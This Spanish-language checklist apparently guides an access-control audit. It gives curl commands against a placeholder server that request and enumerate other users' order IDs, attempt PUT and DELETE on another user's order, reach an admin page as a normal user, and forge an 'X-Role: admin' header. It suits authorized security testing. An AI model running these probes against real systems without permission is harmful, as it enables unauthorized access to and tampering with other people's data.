Preparamos el entorno coprobando el curl

  curl --version
  
Creamos la carpeta de trabajo

  mkdir auditoria_a01

Acceso a recursos protegidos sin autenticar
  
  curl -i http://servidor/api/orders.php

Intentamos el ccceso a recursos protegidos sin autenticar. Seguramente nos dé como respuesta 401 o 200

  curl -i http://servidor/api/orders.php

Login como usuario normal

  curl -c cookies_user.txt \
       -d "username=usuario1&password=1234" \
       http://servidor/login.php

Acceso autenticado con

  curl -b cookies_user.txt -i http://servidor/api/profile.php

Ahora probamos el Broken Acces Control
--con pedido propio:
  curl -b cookies_user.txt -i \
  "http://servidor/api/order.php?id=1"
--con pedido ajeno: 
  curl -b cookies_user.txt -i \
  "http://servidor/api/order.php?id=2"

Enumeración automática de IDs

  for i in 1 2 3 4 5; do
    curl -s -o /dev/null \
    -w "ID=$i STATUS=%{http_code} SIZE=%{size_download}\n" \
    -b cookies_user.txt \
    "http://servidor/api/order.php?id=$i"
  done

Bypass por método HTTP 
Intento de modificación
  curl -X PUT \
    -H "Content-Type: application/json" \
    -d '{"status":"CANCELLED"}' \
    -b cookies_user.txt \
    -i \
    "http://servidor/api/order.php?id=2"

Intento de borrado
  curl -X DELETE \
    -b cookies_user.txt \
    -i \
    "http://servidor/api/order.php?id=2"

Acceso a funciones admin con usuario normal.
Resultado correcto tiene que dar 403 o 200

  curl -b cookies_user.txt -i \
  http://servidor/admin/dashboard.php

Y sacamos headers

  curl -b cookies_user.txt \
    -H "X-Role: admin" \
    -i \
    http://servidor/api/profile.php

Para guardarlos:

  curl -b cookies_user.txt \
    -D evidencia_headers.txt \
    -o evidencia_body.txt \
    -w "STATUS=%{http_code}\nTIME=%{time_total}\n" \
    "http://servidor/api/order.php?id=2"
